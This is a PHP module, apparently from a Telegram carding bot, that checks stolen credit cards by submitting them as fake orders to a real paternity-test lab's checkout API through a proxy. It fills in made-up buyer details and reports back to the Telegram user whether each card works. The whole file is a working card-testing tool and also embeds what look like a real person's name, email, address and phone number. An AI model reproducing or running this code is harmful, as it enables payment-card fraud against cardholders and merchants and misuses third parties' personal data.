<?php 

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
$cc[2] = substr($cc[2], -2);

# -- REQ 1 -- #
$headers1 = ['accept: application/json, text/plain, */*','content-type: application/json','origin: https://checkout.paternitylab.com','referer: https://checkout.paternitylab.com/','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.81 Safari/537.36'];
$post1 = '{"type":"home","cart":{"children":1,"alleged_father":1,"mother":0},"result_emails":[{"email":"castillovazquez193@gmail.com"}],"separate_kits":[],"shipping":{"first_name":"Enrimar","last_name":"Molina","address":"1682 Crossley St","city":"Fortville","state":"IN","zipcode":"46040","email":"castillovazquez193@gmail.com","phone":"5023851035","type":"FedEx","separate_kits":false},"payment":{"type":"credit_card","credit_card":{"number":"'.$cc[0].'","exp_month":"'.$cc[1].'","exp_year":"'.$cc[2].'","billing_zip":"46040","cvv":"'.$cc[3].'"},"nonce":""},"agreement":true}';
$site1 = ['url' => 'https://api.paternitylab.com/order','method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => $cookie, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, $cece, $gate['name'], $lang['wait']));
$resp_msg = str_replace('"', '', $req1->body);
Res::SetParams($resp_msg, $req1->body);
$res = Res::unkccnc();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));